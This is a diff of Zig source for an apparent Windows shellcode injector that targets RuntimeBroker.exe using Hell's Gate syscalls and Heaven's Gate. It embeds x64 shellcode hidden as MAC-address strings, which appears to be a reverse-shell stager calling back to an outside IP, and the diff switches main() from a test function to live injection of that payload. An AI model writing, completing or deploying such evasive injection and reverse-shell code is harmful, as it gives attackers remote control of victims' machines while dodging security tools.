@@ -14,6 +14,8 @@ const TH32CS_SNAPPROCESS: DWORD = 0x00000002;
 const INVALID_HANDLE_VALUE: HANDLE = @as(HANDLE, @ptrFromInt(@as(usize, @bitCast(@as(isize, -1)))));
 const MAX_PATH: usize = 260;
 
+const target_process_name = "RuntimeBroker.exe";
+
 // PROCESSENTRY32W structure
 const PROCESSENTRY32W = extern struct {
     dwSize: DWORD,
@@ -31,14 +33,18 @@ const PROCESSENTRY32W = extern struct {
 const MAC_ARRAY: [85][]const u8 = [_][]const u8{ "fc:48:83:e4:f0:e8", "cc:00:00:00:41:51", "41:50:52:48:31:d2", "51:56:65:48:8b:52", "60:48:8b:52:18:48", "8b:52:20:48:0f:b7", "4a:4a:4d:31:c9:48", "8b:72:50:48:31:c0", "ac:3c:61:7c:02:2c", "20:41:c1:c9:0d:41", "01:c1:e2:ed:52:41", "51:48:8b:52:20:8b", "42:3c:48:01:d0:66", "81:78:18:0b:02:0f", "85:72:00:00:00:8b", "80:88:00:00:00:48", "85:c0:74:67:48:01", "d0:8b:48:18:44:8b", "40:20:50:49:01:d0", "e3:56:4d:31:c9:48", "ff:c9:41:8b:34:88", "48:01:d6:48:31:c0", "41:c1:c9:0d:ac:41", "01:c1:38:e0:75:f1", "4c:03:4c:24:08:45", "39:d1:75:d8:58:44", "8b:40:24:49:01:d0", "66:41:8b:0c:48:44", "8b:40:1c:49:01:d0", "41:8b:04:88:48:01", "d0:41:58:41:58:5e", "59:5a:41:58:41:59", "41:5a:48:83:ec:20", "41:52:ff:e0:58:41", "59:5a:48:8b:12:e9", "4b:ff:ff:ff:5d:49", "be:77:73:32:5f:33", "32:00:00:41:56:49", "89:e6:48:81:ec:a0", "01:00:00:49:89:e5", "49:bc:02:00:05:39", "64:56:41:1d:41:54", "49:89:e4:4c:89:f1", "41:ba:4c:77:26:07", "ff:d5:4c:89:ea:68", "01:01:00:00:59:41", "ba:29:80:6b:00:ff", "d5:6a:0a:41:5e:50", "50:4d:31:c9:4d:31", "c0:48:ff:c0:48:89", "c2:48:ff:c0:48:89", "c1:41:ba:ea:0f:df", "e0:ff:d5:48:89:c7", "6a:10:41:58:4c:89", "e2:48:89:f9:41:ba", "99:a5:74:61:ff:d5", "85:c0:74:0a:49:ff", "ce:75:e5:e8:93:00", "00:00:48:83:ec:10", "48:89:e2:4d:31:c9", "6a:04:41:58:48:89", "f9:41:ba:02:d9:c8", "5f:ff:d5:83:f8:00", "7e:55:48:83:c4:20", "5e:89:f6:6a:40:41", "59:68:00:10:00:00", "41:58:48:89:f2:48", "31:c9:41:ba:58:a4", "53:e5:ff:d5:48:89", "c3:49:89:c7:4d:31", "c9:49:89:f0:48:89", "da:48:89:f9:41:ba", "02:d9:c8:5f:ff:d5", "83:f8:00:7d:28:58", "41:57:59:68:00:40", "00:00:41:58:6a:00", "5a:41:ba:0b:2f:0f", "30:ff:d5:57:59:41", "ba:75:6e:4d:61:ff", "d5:49:ff:ce:e9:3c", "ff:ff:ff:48:01:c3", "48:29:c6:48:85:f6", "75:b4:41:ff:e7:58", "6a:00:59:49:c7:c2", "f0:b5:a2:56:ff:d5" };
 const NUMBER_OF_ELEMENTS: usize = 85;
 
-const target_process_name = "SearchIndexer.exe";
-
 extern "kernel32" fn OpenProcess(dwDesiredAccess: DWORD, bInheritHandle: BOOL, dwProcessId: DWORD) callconv(WINAPI) ?HANDLE;
 extern "kernel32" fn CreateToolhelp32Snapshot(dwFlags: DWORD, th32ProcessID: DWORD) callconv(WINAPI) HANDLE;
 extern "kernel32" fn Process32FirstW(hSnapshot: HANDLE, lppe: *PROCESSENTRY32W) callconv(WINAPI) BOOL;
 extern "kernel32" fn Process32NextW(hSnapshot: HANDLE, lppe: *PROCESSENTRY32W) callconv(WINAPI) BOOL;
 extern "kernel32" fn CloseHandle(hObject: HANDLE) callconv(WINAPI) BOOL;
 extern "kernel32" fn GetLastError() callconv(WINAPI) DWORD;
+extern "user32" fn MessageBoxA(
+    hwnd: ?win.HWND,
+    lptext: [*:0]const u8,
+    lpcaption: [*:0]const u8,
+    utype: u32,
+) callconv(.c) i32;
 
 // Helper function to convert UTF-8 string to UTF-16 (wide string)
 fn convertToWideString(allocator: std.mem.Allocator, utf8_str: []const u8) ![]u16 {
@@ -99,8 +105,25 @@ fn getRemoteProcessPid(allocator: std.mem.Allocator, process_name: []const u8) !
             break;
         }
     }
-
+    std.debug.print("{s}", .{process_name});
     return error.ProcessNotFound;
+}
+
+// Simple test function without MessageBox
+fn simpleTestFunction() callconv(.C) u32 {
+    std.debug.print("[TEST] Function executed in 64-bit mode!\n", .{});
+
+    // Do some calculations to verify execution
+    var sum: u32 = 0;
+    var i: u32 = 1;
+    while (i <= 100) : (i += 1) {
+        sum += i;
+    }
+
+    std.debug.print("[TEST] Sum of 1-100: {d} (should be 5050)\n", .{sum});
+    std.debug.print("[TEST] Function completed successfully!\n", .{});
+
+    return 0x12345678; // Return a recognizable value
 }
 
 fn runX64ShellcodeByHellsGate() !void {
@@ -118,7 +141,6 @@ fn runX64ShellcodeByHellsGate() !void {
     // -----------------------------------------
     // Init vx_table for Hell's Gate
     // -----------------------------------------
-    // Fix: Handle the optional return type properly
     var vx_table = hell.init_vx_table() orelse {
         std.debug.print("[-] Failed to initialize Hell's Gate VX table\n", .{});
         return;
@@ -149,34 +171,31 @@ fn runX64ShellcodeByHellsGate() !void {
     // -----------------------------------------
     // Inject the shellcode by Hell's Gate
     // -----------------------------------------
+    _ = hell.init();
     hell_success = hell.hellsGateInject(&vx_table, target_process_handle, shellcode.ptr, shellcode.len);
 
     std.debug.print("[*] Hell's Gate injection result: {}\n", .{hell_success});
 }
 
 pub fn main() !void {
-    // Check if Heaven's Gate conditions are met
+    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
+    defer _ = gpa.deinit();
+    const allocator = gpa.allocator();
+
     if (!heaven.is_available()) {
         std.process.exit(1);
     }
 
-    // Fix: Properly cast function pointer without discarding const
-    const func_addr: ?*anyopaque = @ptrCast(@constCast(&runX64ShellcodeByHellsGate));
+    const pid = try getRemoteProcessPid(allocator, target_process_name);
 
-    // No arguments needed for this function
-    const argc: c_int = 0;
-    var argv: [1]u64 = [_]u64{0}; // Dummy array since argc is 0
-    var ret_val: u64 = 0;
+    // const hell_shellcode: []const u8 = @embedFile("loader.bin");
+    const hell_shellcode = try payloads.macDeobfuscation(&payloads.hell_shellcode, allocator);
+    defer allocator.free(hell_shellcode); // Don't forget to free the allocated memory
 
-    // Execute Heaven's Gate technique to run the function in 64-bit mode
-    // const result = heaven.injectFunction(func_addr, argc, &argv, &ret_val);
-    _ = heaven.injectFunction(func_addr, argc, &argv, &ret_val);
-
-    // if (result != 0) {
-    //     std.debug.print("[+] Successfully executed function via Heaven's Gate\n", .{});
-    //     std.debug.print("[*] Return value: 0x{X}\n", .{ret_val});
-    // } else {
-    //     std.debug.print("[-] Failed to execute function via Heaven's Gate\n", .{});
-    //     std.process.exit(1);
-    // }
+    // Cast to many-item pointer
+    _ = heaven.injectShellcode(
+        pid,
+        @ptrCast(@constCast(hell_shellcode.ptr)),
+        hell_shellcode.len,
+    );
 }
